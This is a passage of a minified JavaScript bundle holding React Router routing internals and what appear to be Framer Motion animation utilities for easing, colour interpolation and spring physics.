c=="number"){s.go(c);return}let d=_d(c,JSON.parse(o),i,u.relative==="path");e==null&&t!=="/"&&(d.pathname=d.pathname==="/"?t:xn([t,d.pathname])),(u.replace?s.replace:s.push)(d,u.state,u)},[t,s,o,i,e])}function aI(){let{matches:e}=w.useContext(Zt),t=e[e.length-1];return t?t.params:{}}function Cw(e,t){let{relative:n}=t===void 0?{}:t,{future:s}=w.useContext(qn),{matches:r}=w.useContext(Zt),{pathname:i}=en(),o=JSON.stringify(Dd(r,s.v7_relativeSplatPath));return w.useMemo(()=>_d(e,JSON.parse(o),i,n==="path"),[e,o,i,n])}function m1(e,t){return g1(e,t)}function g1(e,t,n,s){sr()||oe(!1);let{navigator:r}=w.useContext(qn),{matches:i}=w.useContext(Zt),o=i[i.length-1],a=o?o.params:{};o&&o.pathname;let l=o?o.pathnameBase:"/";o&&o.route;let c=en(),u;if(t){var d;let x=typeof t=="string"?as(t):t;l==="/"||(d=x.pathname)!=null&&d.startsWith(l)||oe(!1),u=x}else u=c;let h=u.pathname||"/",m=h;if(l!=="/"){let x=l.replace(/^\//,"").split("/");m="/"+h.replace(/^\//,"").split("/").slice(x.length).join("/")}let f=zk(e,{pathname:m}),v=x1(f&&f.map(x=>Object.assign({},x,{params:Object.assign({},a,x.params),pathname:xn([l,r.encodeLocation?r.encodeLocation(x.pathname).pathname:x.pathname]),pathnameBase:x.pathnameBase==="/"?l:xn([l,r.encodeLocation?r.encodeLocation(x.pathnameBase).pathname:x.pathnameBase])})),i,n,s);return t&&v?w.createElement(za.Provider,{value:{location:ci({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:dn.Pop}},v):v}function y1(){let e=C1(),t=u1(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),n=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return w.createElement(w.Fragment,null,w.createElement("h2",null,"Unexpected Application Error!"),w.createElement("h3",{style:{fontStyle:"italic"}},t),n?w.createElement("pre",{style:r},n):null,null)}const w1=w.createElement(y1,null);class v1 extends w.Component{constructor(t){super(t),this.state={location:t.location,revalidation:t.revalidation,error:t.error}}static getDerivedStateFromError(t){return{error:t}}static getDerivedStateFromProps(t,n){return n.location!==t.location||n.revalidation!=="idle"&&t.revalidation==="idle"?{error:t.error,location:t.location,revalidation:t.revalidation}:{error:t.error!==void 0?t.error:n.error,location:n.location,revalidation:t.revalidation||n.revalidation}}componentDidCatch(t,n){console.error("React Router caught the following error during render",t,n)}render(){return this.state.error!==void 0?w.createElement(Zt.Provider,{value:this.props.routeContext},w.createElement(Sw.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function b1(e){let{routeContext:t,match:n,children:s}=e,r=w.useContext(Fd);return r&&r.static&&r.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=n.route.id),w.createElement(Zt.Provider,{value:t},s)}function x1(e,t,n,s){var r;if(t===void 0&&(t=[]),n===void 0&&(n=null),s===void 0&&(s=null),e==null){var i;if(!n)return null;if(n.errors)e=n.matches;else if((i=s)!=null&&i.v7_partialHydration&&t.length===0&&!n.initialized&&n.matches.length>0)e=n.matches;else return null}let o=e,a=(r=n)==null?void 0:r.errors;if(a!=null){let u=o.findIndex(d=>d.route.id&&(a==null?void 0:a[d.route.id])!==void 0);u>=0||oe(!1),o=o.slice(0,Math.min(o.length,u+1))}let l=!1,c=-1;if(n&&s&&s.v7_partialHydration)for(let u=0;u<o.length;u++){let d=o[u];if((d.route.HydrateFallback||d.route.hydrateFallbackElement)&&(c=u),d.route.id){let{loaderData:h,errors:m}=n,f=d.route.loader&&h[d.route.id]===void 0&&(!m||m[d.route.id]===void 0);if(d.route.lazy||f){l=!0,c>=0?o=o.slice(0,c+1):o=[o[0]];break}}}return o.reduceRight((u,d,h)=>{let m,f=!1,v=null,x=null;n&&(m=a&&d.route.id?a[d.route.id]:void 0,v=d.route.errorElement||w1,l&&(c<0&&h===0?(E1("route-fallback"),f=!0,x=null):c===h&&(f=!0,x=d.route.hydrateFallbackElement||null)));let y=t.concat(o.slice(0,h+1)),g=()=>{let b;return m?b=v:f?b=x:d.route.Component?b=w.createElement(d.route.Component,null):d.route.element?b=d.route.element:b=u,w.createElement(b1,{match:d,routeContext:{outlet:u,matches:y,isDataRoute:n!=null},children:b})};return n&&(d.route.ErrorBoundary||d.route.errorElement||h===0)?w.createElement(v1,{location:n.location,revalidation:n.revalidation,component:v,error:m,children:g(),routeContext:{outlet:null,matches:y,isDataRoute:!0}}):g()},null)}var Aw=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Aw||{}),Ew=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(Ew||{});function k1(e){let t=w.useContext(Fd);return t||oe(!1),t}function S1(e){let t=w.useContext(h1);return t||oe(!1),t}function T1(e){let t=w.useContext(Zt);return t||oe(!1),t}function Rw(e){let t=T1(),n=t.matches[t.matches.length-1];return n.route.id||oe(!1),n.route.id}function C1(){var e;let t=w.useContext(Sw),n=S1(),s=Rw();return t!==void 0?t:(e=n.errors)==null?void 0:e[s]}function A1(){let{router:e}=k1(Aw.UseNavigateStable),t=Rw(Ew.UseNavigateStable),n=w.useRef(!1);return Tw(()=>{n.current=!0}),w.useCallback(function(r,i){i===void 0&&(i={}),n.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,ci({fromRouteId:t},i)))},[e,t])}const Qp={};function E1(e,t,n){Qp[e]||(Qp[e]=!0)}function R1(e,t){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function P1(e){let{to:t,replace:n,state:s,relative:r}=e;sr()||oe(!1);let{future:i,static:o}=w.useContext(qn),{matches:a}=w.useContext(Zt),{pathname:l}=en(),c=$a(),u=_d(t,Dd(a,i.v7_relativeSplatPath),l,r==="path"),d=JSON.stringify(u);return w.useEffect(()=>c(JSON.parse(d),{replace:n,state:s,relative:r}),[c,d,r,n,s]),null}function tt(e){oe(!1)}function q1(e){let{basename:t="/",children:n=null,location:s,navigationType:r=dn.Pop,navigator:i,static:o=!1,future:a}=e;sr()&&oe(!1);let l=t.replace(/^\/*/,"/"),c=w.useMemo(()=>({basename:l,navigator:i,static:o,future:ci({v7_relativeSplatPath:!1},a)}),[l,a,i,o]);typeof s=="string"&&(s=as(s));let{pathname:u="/",search:d="",hash:h="",state:m=null,key:f="default"}=s,v=w.useMemo(()=>{let x=Ld(u,l);return x==null?null:{location:{pathname:x,search:d,hash:h,state:m,key:f},navigationType:r}},[l,u,d,h,m,f,r]);return v==null?null:w.createElement(qn.Provider,{value:c},w.createElement(za.Provider,{children:n,value:v}))}function O1(e){let{children:t,location:n}=e;return m1(nu(t),n)}new Promise(()=>{});function nu(e,t){t===void 0&&(t=[]);let n=[];return w.Children.forEach(e,(s,r)=>{if(!w.isValidElement(s))return;let i=[...t,r];if(s.type===w.Fragment){n.push.apply(n,nu(s.props.children,i));return}s.type!==tt&&oe(!1),!s.props.index||!s.props.children||oe(!1);let o={id:s.props.id||i.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(o.children=nu(s.props.children,i)),n.push(o)}),n}/**
 * React Router DOM v6.30.6
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function su(){return su=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var s in n)({}).hasOwnProperty.call(n,s)&&(e[s]=n[s])}return e},su.apply(null,arguments)}function I1(e,t){if(e==null)return{};var n={};for(var s in e)if({}.hasOwnProperty.call(e,s)){if(t.indexOf(s)!==-1)continue;n[s]=e[s]}return n}function N1(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function j1(e,t){return e.button===0&&(!t||t==="_self")&&!N1(e)}function ru(e){return e===void 0&&(e=""),new URLSearchParams(typeof e=="string"||Array.isArray(e)||e instanceof URLSearchParams?e:Object.keys(e).reduce((t,n)=>{let s=e[n];return t.concat(Array.isArray(s)?s.map(r=>[n,r]):[[n,s]])},[]))}function M1(e,t){let n=ru(e);return t&&t.forEach((s,r)=>{n.has(r)||t.getAll(r).forEach(i=>{n.append(r,i)})}),n}const L1=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],D1="6";try{window.__reactRouterVersion=D1}catch{}const _1="startTransition",Gp=Ex[_1];function F1(e){let{basename:t,children:n,future:s,window:r}=e,i=w.useRef();i.current==null&&(i.current=Vk({window:r,v5Compat:!0}));let o=i.current,[a,l]=w.useState({action:o.action,location:o.location}),{v7_startTransition:c}=s||{},u=w.useCallback(d=>{c&&Gp?Gp(()=>l(d)):l(d)},[l,c]);return w.useLayoutEffect(()=>o.listen(u),[o,u]),w.useEffect(()=>R1(s),[s]),w.createElement(q1,{basename:t,children:n,location:a.location,navigationType:a.action,navigator:o,future:s})}const B1=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",V1=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Re=w.forwardRef(function(t,n){let{onClick:s,relative:r,reloadDocument:i,replace:o,state:a,target:l,to:c,preventScrollReset:u,viewTransition:d}=t,h=I1(t,L1),{basename:m}=w.useContext(qn),f,v=!1;if(typeof c=="string"&&V1.test(c)&&(f=c,B1))try{let b=new URL(window.location.href),k=c.startsWith("//")?new URL(b.protocol+c):new URL(c),C=Ld(k.pathname,m);k.origin===b.origin&&C!=null?c=C+k.search+k.hash:v=!0}catch{}let x=p1(c,{relative:r}),y=W1(c,{replace:o,state:a,target:l,preventScrollReset:u,relative:r,viewTransition:d});function g(b){s&&s(b),b.defaultPrevented||y(b)}return w.createElement("a",su({},h,{href:f||x,onClick:v||i?s:g,ref:n,target:l}))});var Kp;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Kp||(Kp={}));var Yp;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Yp||(Yp={}));function W1(e,t){let{target:n,replace:s,state:r,preventScrollReset:i,relative:o,viewTransition:a}=t===void 0?{}:t,l=$a(),c=en(),u=Cw(e,{relative:o});return w.useCallback(d=>{if(j1(d,n)){d.preventDefault();let h=s!==void 0?s:ca(c)===ca(u);l(e,{replace:h,state:r,preventScrollReset:i,relative:o,viewTransition:a})}},[c,l,u,s,r,n,e,i,o,a])}function U1(e){let t=w.useRef(ru(e)),n=w.useRef(!1),s=en(),r=w.useMemo(()=>M1(s.search,n.current?null:t.current),[s.search]),i=$a(),o=w.useCallback((a,l)=>{const c=ru(typeof a=="function"?a(r):a);n.current=!0,i("?"+c,l)},[i,r]);return[r,o]}const Bd=w.createContext({});function Cn(e){const t=w.useRef(null);return t.current===null&&(t.current=e()),t.current}const z1=typeof window<"u",Ys=z1?w.useLayoutEffect:w.useEffect,Ha=w.createContext(null);function Vd(e,t){e.indexOf(t)===-1&&e.push(t)}function ua(e,t){const n=e.indexOf(t);n>-1&&e.splice(n,1)}function lI([...e],t,n){const s=t<0?e.length+t:t;if(s>=0&&s<e.length){const r=n<0?e.length+n:n,[i]=e.splice(t,1);e.splice(r,0,i)}return e}const ut=(e,t,n)=>n>t?t:n<e?e:n;let Qa=()=>{};const Xt={},Wd=e=>/^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(e),Pw=e=>typeof e=="object"&&e!==null,Ud=e=>/^0[^.\s]+$/u.test(e);function qw(e){let t;return()=>(t===void 0&&(t=e()),t)}const Ye=e=>e,Ai=(...e)=>e.reduce((t,n)=>s=>n(t(s))),Xs=(e,t,n)=>{const s=t-e;return s?(n-e)/s:1};class da{constructor(){this.subscriptions=[]}add(t){return Vd(this.subscriptions,t),()=>this.remove(t)}remove(t){ua(this.subscriptions,t)}notify(t,n,s){const r=this.subscriptions.length;if(r)if(r===1)this.subscriptions[0](t,n,s);else for(let i=0;i<r;i++){const o=this.subscriptions[i];o&&o(t,n,s)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const at=e=>e*1e3,Ge=e=>e/1e3,zd=(e,t)=>t?e*(1e3/t):0,Ow=(e,t,n)=>(((1-3*n+3*t)*e+(3*n-6*t))*e+3*t)*e,$1=1e-7,H1=12;function Q1(e,t,n,s,r){let i,o,a=0;do o=t+(n-t)/2,i=Ow(o,s,r)-e,i>0?n=o:t=o;while(Math.abs(i)>$1&&++a<H1);return o}function Ei(e,t,n,s){if(e===t&&n===s)return Ye;const r=i=>Q1(i,0,1,e,n);return i=>i===0||i===1?i:Ow(r(i),t,s)}const Iw=e=>t=>t<=.5?e(2*t)/2:(2-e(2*(1-t)))/2,Nw=e=>t=>1-e(1-t),jw=Ei(.33,1.53,.69,.99),$d=Nw(jw),Mw=Iw($d),Lw=e=>e>=1?1:(e*=2)<1?.5*$d(e):.5*(2-Math.pow(2,-10*(e-1))),Hd=e=>1-Math.sin(Math.acos(e)),Dw=Nw(Hd),_w=Iw(Hd),G1=Ei(.42,0,1,1),K1=Ei(0,0,.58,1),Fw=Ei(.42,0,.58,1),Y1=e=>Array.isArray(e)&&typeof e[0]!="number",Bw=e=>Array.isArray(e)&&typeof e[0]=="number",X1={linear:Ye,easeIn:G1,easeInOut:Fw,easeOut:K1,circIn:Hd,circInOut:_w,circOut:Dw,backIn:$d,backInOut:Mw,backOut:jw,anticipate:Lw},J1=e=>typeof e=="string",Xp=e=>{if(Bw(e)){Qa(e.length===4);const[t,n,s,r]=e;return Ei(t,n,s,r)}else if(J1(e))return X1[e];return e},no=["setup","read","resolveKeyframes","preUpdate","update","preRender","render","postRender"];function Z1(e){let t=new Set,n=new Set,s=!1,r=!1;const i=new Set;let o={delta:0,timestamp:0,isProcessing:!1};function a(c){i.has(c)&&(n.add(c),e()),c(o)}const l={schedule:(c,u=!1,d=!1)=>{const m=d&&s?t:n;return u&&i.add(c),m.add(c),c},cancel:c=>{n.delete(c),i.delete(c)},process:c=>{if(o=c,s){r=!0;return}s=!0;const u=t;t=n,n=u,t.forEach(a),t.clear(),s=!1,r&&(r=!1,l.process(c))}};return l}const eS=40;function Vw(e,t){let n=!1,s=!0;const r={delta:0,timestamp:0,isProcessing:!1},i=()=>n=!0,o=no.reduce((b,k)=>(b[k]=Z1(i),b),{}),{setup:a,read:l,resolveKeyframes:c,preUpdate:u,update:d,preRender:h,render:m,postRender:f}=o,v=()=>{const b=Xt.useManualTiming,k=b?r.timestamp:performance.now();n=!1,b||(r.delta=s?1e3/60:Math.max(Math.min(k-r.timestamp,eS),1)),r.timestamp=k,r.isProcessing=!0,a.process(r),l.process(r),c.process(r),u.process(r),d.process(r),h.process(r),m.process(r),f.process(r),r.isProcessing=!1,n&&t&&(s=!1,e(v))},x=()=>{n=!0,s=!0,r.isProcessing||e(v)};return{schedule:no.reduce((b,k)=>{const C=o[k];return b[k]=(E,S=!1,T=!1)=>(n||x(),C.schedule(E,S,T)),b},{}),cancel:b=>{for(let k=0;k<no.length;k++)o[no[k]].cancel(b)},state:r,steps:o}}const{schedule:B,cancel:We,state:ce,steps:ql}=Vw(typeof requestAnimationFrame<"u"?requestAnimationFrame:Ye,!0);let Oo;function tS(){Oo=void 0}const be={now:()=>(Oo===void 0&&be.set(ce.isProcessing||Xt.useManualTiming?ce.timestamp:performance.now()),Oo),set:e=>{Oo=e,queueMicrotask(tS)}},Fs=e=>Math.round(e*1e5)/1e5,Ww=e=>t=>typeof t=="string"&&t.startsWith(e),Uw=Ww("--"),nS=Ww("var(--"),Qd=e=>nS(e)?sS.test(e.split("/*")[0].trim()):!1,sS=/var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu;function Jp(e){return typeof e!="string"?!1:e.split("/*")[0].includes("var(--")}const rr={test:e=>typeof e=="number",parse:parseFloat,transform:e=>e},ui={...rr,transform:e=>ut(0,1,e)},so={...rr,default:1},Gd=/-?(?:\d+(?:\.\d+)?|\.\d+)/gu;function rS(e){return e==null}const iS=/^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu,Kd=(e,t)=>n=>!!(typeof n=="string"&&iS.test(n)&&n.startsWith(e)||t&&!rS(n)&&Object.prototype.hasOwnProperty.call(n,t)),zw=(e,t,n)=>s=>{if(typeof s!="string")return s;const[r,i,o,a]=s.match(Gd);return{[e]:parseFloat(r),[t]:parseFloat(i),[n]:parseFloat(o),alpha:a!==void 0?parseFloat(a):1}},oS=e=>ut(0,255,e),Ol={...rr,transform:e=>Math.round(oS(e))},Un={test:Kd("rgb","red"),parse:zw("red","green","blue"),transform:({red:e,green:t,blue:n,alpha:s=1})=>"rgba("+Ol.transform(e)+", "+Ol.transform(t)+", "+Ol.transform(n)+", "+Fs(ui.transform(s))+")"};function aS(e){let t="",n="",s="",r="";return e.length>5?(t=e.substring(1,3),n=e.substring(3,5),s=e.substring(5,7),r=e.substring(7,9)):(t=e.substring(1,2),n=e.substring(2,3),s=e.substring(3,4),r=e.substring(4,5),t+=t,n+=n,s+=s,r+=r),{red:parseInt(t,16),green:parseInt(n,16),blue:parseInt(s,16),alpha:r?parseInt(r,16)/255:1}}const iu={test:Kd("#"),parse:aS,transform:Un.transform},Ri=e=>({test:t=>typeof t=="string"&&t.endsWith(e)&&t.split(" ").length===1,parse:parseFloat,transform:t=>`${t}${e}`}),Bt=Ri("deg"),Mt=Ri("%"),N=Ri("px"),lS=Ri("vh"),cS=Ri("vw"),Zp={...Mt,parse:e=>Mt.parse(e)/100,transform:e=>Mt.transform(e*100)},Es={test:Kd("hsl","hue"),parse:zw("hue","saturation","lightness"),transform:({hue:e,saturation:t,lightness:n,alpha:s=1})=>"hsla("+Math.round(e)+", "+Mt.transform(Fs(t))+", "+Mt.transform(Fs(n))+", "+Fs(ui.transform(s))+")"},he={test:e=>Un.test(e)||iu.test(e)||Es.test(e),parse:e=>Un.test(e)?Un.parse(e):Es.test(e)?Es.parse(e):iu.parse(e),transform:e=>typeof e=="string"?e:e.hasOwnProperty("red")?Un.transform(e):Es.transform(e),getAnimatableNone:e=>{const t=he.parse(e);return t.alpha=0,he.transform(t)}},uS=/(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu,$w=new RegExp(Gd.source),Hw=new RegExp(uS.source,"i");function dS(e){return isNaN(e)&&typeof e=="string"&&($w.test(e)||Hw.test(e))}const Qw="number",Gw="color",hS="var",pS="var(",ef="${}",fS=/var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;function mS(e){const t=e.toString();return $w.test(t)||Hw.test(t)}function di(e){const t=e.toString(),n=[],s={color:[],number:[],var:[]},r=[];let i=0;const a=t.replace(fS,l=>(he.test(l)?(s.color.push(i),r.push(Gw),n.push(he.parse(l))):l.startsWith(pS)?(s.var.push(i),r.push(hS),n.push(l)):(s.number.push(i),r.push(Qw),n.push(parseFloat(l))),++i,ef)).split(ef);return{values:n,split:a,indexes:s,types:r}}function gS(e){return di(e).values}function Kw({split:e,types:t}){const n=e.length;return s=>{let r="";for(let i=0;i<n;i++)if(r+=e[i],s[i]!==void 0){const o=t[i];o===Qw?r+=Fs(s[i]):o===Gw?r+=he.transform(s[i]):r+=s[i]}return r}}function yS(e){return Kw(di(e))}const wS=e=>typeof e=="number"?0:he.test(e)?he.getAnimatableNone(e):e,vS=(e,t)=>typeof e=="number"?t!=null&&t.trim().endsWith("/")?e:0:wS(e);function bS(e){const t=di(e);return Kw(t)(t.values.map((s,r)=>vS(s,t.split[r])))}const Xe={test:dS,parse:gS,createTransformer:yS,getAnimatableNone:bS};function Il(e,t,n){return n<0&&(n+=1),n>1&&(n-=1),n<1/6?e+(t-e)*6*n:n<1/2?t:n<2/3?e+(t-e)*(2/3-n)*6:e}function xS({hue:e,saturation:t,lightness:n,alpha:s}){e/=360,t/=100,n/=100;let r=0,i=0,o=0;if(!t)r=i=o=n;else{const a=n<.5?n*(1+t):n+t-n*t,l=2*n-a;r=Il(l,a,e+1/3),i=Il(l,a,e),o=Il(l,a,e-1/3)}return{red:Math.round(r*255),green:Math.round(i*255),blue:Math.round(o*255),alpha:s}}function ha(e,t){return n=>n>0?t:e}const H=(e,t,n)=>e+(t-e)*n,Nl=(e,t,n)=>{const s=e*e,r=n*(t*t-s)+s;return r<0?0:Math.sqrt(r)},kS=[iu,Un,Es],SS=e=>kS.find(t=>t.test(e));function tf(e){const t=SS(e);if(!t)return!1;let n=t.parse(e);return t===Es&&(n=xS(n)),n}const nf=(e,t)=>{const n=tf(e),s=tf(t);if(!n||!s)return ha(e,t);const r={...n};return i=>(r.red=Nl(n.red,s.red,i),r.green=Nl(n.green,s.green,i),r.blue=Nl(n.blue,s.blue,i),r.alpha=H(n.alpha,s.alpha,i),Un.transform(r))},ou=new Set(["none","hidden"]);function TS(e,t){return ou.has(e)?n=>n<=0?e:t:n=>n>=1?t:e}function CS(e,t){return n=>H(e,t,n)}function Yd(e){return typeof e=="number"?CS:typeof e=="string"?Qd(e)?ha:he.test(e)?nf:RS:Array.isArray(e)?Yw:typeof e=="object"?he.test(e)?nf:AS:ha}function Yw(e,t){const n=[...e],s=n.length,r=e.map((i,o)=>Yd(i)(i,t[o]));return i=>{for(let o=0;o<s;o++)n[o]=r[o](i);return n}}function AS(e,t){const n={...e,...t},s={};for(const r in n)e[r]!==void 0&&t[r]!==void 0&&(s[r]=Yd(e[r])(e[r],t[r]));return r=>{for(const i in s)n[i]=s[i](r);return n}}function ES(e,t){const n=[],s={color:0,var:0,number:0};for(let r=0;r<t.values.length;r++){const i=t.types[r],o=e.indexes[i][s[i]],a=e.values[o]??0;n[r]=a,s[i]++}return n}const RS=(e,t)=>{const n=Xe.createTransformer(t),s=di(e),r=di(t);return s.indexes.var.length===r.indexes.var.length&&s.indexes.color.length===r.indexes.color.length&&s.indexes.number.length>=r.indexes.number.length?ou.has(e)&&!r.values.length||ou.has(t)&&!s.values.length?TS(e,t):Ai(Yw(ES(s,r),r.values),n):ha(e,t)},sf=/^(-?(?:\d+(?:\.\d*)?|\.\d+))([a-z%]*)$/iu;function PS(e,t){const n=sf.exec(e);if(!n)return;const s=sf.exec(t);if(!s||n[2]!==s[2])return;const r=n[2],i=parseFloat(n[1]),o=parseFloat(s[1]);return a=>Fs(H(i,o,a))+r}function Xd(e,t,n){if(typeof e=="number"&&typeof t=="number"&&typeof n=="number")return H(e,t,n);if(typeof e=="string"&&typeof t=="string"){const r=PS(e,t);if(r)return r}return Yd(e)(e,t)}const qS=e=>{const t=({timestamp:n})=>e(n);return{start:(n=!0)=>B.update(t,n),stop:()=>We(t),now:()=>ce.isProcessing?ce.timestamp:be.now()}},Xw=(e,t,n=10)=>{let s="";const r=Math.max(Math.round(t/n),2);for(let i=0;i<r;i++)s+=Math.round(e(i/(r-1))*1e4)/1e4+", ";return`linear(${s.substring(0,s.length-2)})`},Jd=2e4;function Zd(e,t=50,n=Jd,s){let r=0,i=e.next(r);for(;!i.done&&r<n;)r+=t,i=e.next(r);return r>=n?1/0:r}function OS(e,t=100,n){const s=n({...e,keyframes:[0,t]}),r=Math.min(Zd(s),Jd);return{type:"keyframes",ease:i=>s.next(r*i).value/t,duration:Ge(r)}}const se={stiffness:100,damping:10,mass:1,velocity:0,duration:800,bounce:.3,visualDuration:.3,restSpeed:{granular:.01,default:2},restDelta:{granular:.005,default:.5},minDuration:.01,maxDuration:10,minDamping:.05,maxDamping:1};function au(e,t){return e*Math.sqrt(1-t*t)}const IS=12;function NS(e,t,n){let s=n;for(let r=1;r<IS;r++)s=s-e(s)/t(s);return s}const jl=.001;function jS({duration:e=se.duration,bounce:t=se.bounce,velocity:n=se.velocity,mass:s=se.mass}){let r,i,o=1-t;o=ut(se.minDamping,se.maxDamping,o),e=ut(se.minDuration,se.maxDuration,Ge(e)),o<1?(r=c=>{const u=c*o,d=u*e,h=u-n,m=au(c,o),f=Math.exp(-d);return jl-h/m*f},i=c=>{const d=c*o*e,h=d*n+n,m=o*o*c*c*e,f=Math.exp(-d),v=au(c*c,o);return(-r(c)+jl>0?-1:1)*((h-m)*f)/v}):(r=c=>{const u=Math.exp(-c*e),d=(c-n)*e+1;return-jl+u*d},i=c=>{const u=Math.exp(-c*e),d=(n-c)*(e*e);return u*d});const a=5/e,l=NS(r,i,a);if(e=at(e),isNaN(l))return{stiffness:se.stiffness,damping:se.damping,duration:e};{const c=l*l*s;return{stiffness:c,damping:o*2*Math.sqrt(s*c),duration:e}}}const Jw=["duration","bounce"],Zw=["stiffness","damping","mass"];function pa(e,t){return t.some(n=>e[n]!==void 0)}function MS(e){let t={velocity:se.velocity,stiffness:se.stiffness,damping:se.damping,mass:se.mass,isResolvedFromDuration:!1,...e};if(!pa(e,Zw)&&pa(e,Jw))if(t.velocity=0,e.visualDuration){const n=e.visualDuration,s=2*Math.PI/(n*1.2),r=s*s,i=2*ut(.05,1,1-(e.bounce||0))*Math.sqrt(r);t={...t,mass:se.mass,stiffness:r,damping:i}}else{const n=jS({...e,velocity:0});t={...t,...n,mass:se.mass},t.isResolvedFromDuration=!0}return t}function fa(e=se.visualDuration,t=se.bounce){const n=typeof e!="object"?{visualDuration:e,keyframes:[0,1],bounce:t}:e,s=n.keyframes[0],r=n.keyframes[n.keyframes.length-1],i={done:!1,value:s},{stiffness:o,damping:a,mass:l,duration:c,velocity:u,isResolvedFromDuration:d}=MS({...n,velocity:-Ge(n.velocity||0)}),h=a/(2*Math.sqrt(o*l)),m=Ge(Math.sqrt(o/l)),f=h*m,v={target:r,delta:r-s,velocity:u||0,restSpeed:0,restDelta:0},x=()=>{const S=Math.abs(v.delta)<5;v.restSpeed=n.restSpeed||(S?se.restSpeed.granular:se.restSpeed.default),v.restDelta=n.restDelta||(S?se.restDelta.granular:se.restDelta.default)};x();let y,g,b;if(h<1){const S=au(m,h),T={A:0,sinC:0,cosC:0,t:-1,env:0,sin:0,cos:0};b=()=>{T.A=(v.velocity+f*v.delta)/S,T.sinC=f*T.A+v.delta*S,T.cosC=f*v.delta-T.A*S};const q=R=>{R!==T.t&&(T.t=R,T.env=Math.exp(-f*R),T.sin=Math.sin(S*R),T.cos=Math.cos(S*R))};y=R=>(q(R),v.target-T.env*(T.A*T.sin+v.delta*T.cos)),g=R=>(q(R),T.env*(T.sinC*T.sin+T.cosC*T.cos))}else if(h===1){y=T=>v.target-Math.exp(-m*T)*(v.delta+(v.velocity+m*v.delta)*T);const S={C:0};b=()=>{S.C=v.velocity+m*v.delta},g=T=>Math.exp(-m*T)*(m*S.C*T-v.velocity)}else{const S=m*Math.sqrt(h*h-1);y=q=>{const R=Math.exp(-f*q),M=Math.min(S*q,300);return v.target-R*((v.velocity+f*v.delta)*Math.sinh(M)+S*v.delta*Math.cosh(M))/S};const T={P:0,sinh:0,cosh:0};b=()=>{T.P=(v.velocity+f*v.delta)/S,T.sinh=f*T.P-v.delta*S,T.cosh=f*v.delta-T.P*S},g=q=>{const R=Math.exp(-f*q),M=Math.min(S*q,300);return R*(T.sinh*Math.sinh(M)+T.cosh*Math.cosh(M))}}b();const k=!pa(n,Zw)&&pa(n,Jw),C=d&&c||null,E={calculatedDuration:C,retarget:(S,T)=>{v.target=S[S.length-1],v.delta=v.target-S[0],v.velocity=k?0:-Ge(T),n.restSpeed&&n.restDelta||x(),E.calculatedDuration=C,i.done=!1,b()},velocity:S=>at(g(S)),next:S=>{const T=y(S);if(d)i.done=S>=c;else{const q=at(g(S));i.done=Math.abs(q)<=v.restSpeed&&Math.abs(v.target-T)<=v.restDelta}return i.value=i.done?v.target:T,i},toString:()=>{const S=Math.min(Zd(E),Jd),T=Xw(q=>E.next(S*q).value,S,30);return S+"ms "+T},toTransition:()=>{}};return E}fa.applyToOptions=e=>{const t=OS(e,100,fa);return e.ease=t.ease,e.duration=at(t.duration),e.type="keyframes",e};function lu({keyframes:e,velocity:t=0,power:n=.8,timeConstant:s=325,bounceDamping:r=10,bounceStiffness:i=500,modifyTarget:o,min:a,max:l,restDelta:c=.5,restSpeed:u}){const d=e[0],h={done:!1,value:d},m=S=>S<a||S>l,f=S=>a===void 0?l:l===void 0||Math.abs(a-S)<Math.abs(l-S)?a:l;let v=n*t;const x=d+v,y=o===void 